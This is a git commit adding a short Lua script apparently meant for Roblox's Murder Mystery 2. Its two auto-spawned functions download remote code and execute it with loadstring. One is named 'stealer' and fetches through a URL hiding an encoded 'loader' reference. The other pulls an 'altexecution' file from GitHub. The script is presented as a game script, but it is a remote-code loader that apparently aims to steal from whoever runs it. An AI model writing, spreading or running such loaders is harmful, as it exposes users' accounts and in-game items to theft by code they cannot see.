f05d6e11963e739a56ec35efcfeb39282204ffdc
Johnnyissocoollol <progackerroblox@gmail.com>
2026-09-06 21:09:38 -0500

    Create mm2script.lua

---
+++ mm2script.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvbW0yL3JlZnMvaGVhZHMvbWFpbi9tbTJodWIubHVhIn19'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Johnnyissocoollol/mm2/refs/heads/main/altexecution.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
